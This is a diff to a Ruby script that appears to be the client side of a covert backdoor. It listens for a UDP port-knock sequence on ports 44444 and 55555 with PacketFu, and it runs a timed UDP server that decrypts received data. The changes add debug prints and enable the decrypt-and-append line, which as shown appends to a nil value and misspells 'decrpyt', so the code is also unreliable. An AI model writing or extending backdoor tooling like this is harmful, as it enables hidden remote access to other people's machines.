@@ -78,6 +78,7 @@ def listen_for_knock
         pkt =  PacketFu::Packet.parse(p)
         if PacketFu::UDPPacket.can_parse?(p)
           #UDP
+          puts pkt.udp_dst
           if pkt.udp_dst == 44444
             k1 = true
           elsif pkt.udp_dst == 55555
@@ -116,6 +117,7 @@ end
 # - csv of the configuration for the recv server
 #   such as ttl, protocol, port to run on.
 def start_receiving_server(config)
+  payload = nil
   cfg_items = config.split(',')
   if cfg_items[0] == UDP
     recv_thread = Thread.new {
@@ -124,13 +126,12 @@ def start_receiving_server(config)
       socket.bind('0.0.0.0', cfg_items[1].to_i)
       max_time = cfg_items[2].to_i
       timer = Thread.new {sleep max_time}
-      payload = nil
       loop {
         if timer.status == false #ttl has completed
           break
         end
         #check size for recv
-        #payload += decrpyt(socket.recv(1024))
+        payload += decrpyt(socket.recv(1024))
       }
       puts "recv server ending (udp)"
     }
@@ -140,6 +141,7 @@ def start_receiving_server(config)
   else
     #not implemented: other protocol receiving servers
   end
+  puts payload
 end
 
 # Command loop for client to communcation to backdoor server.
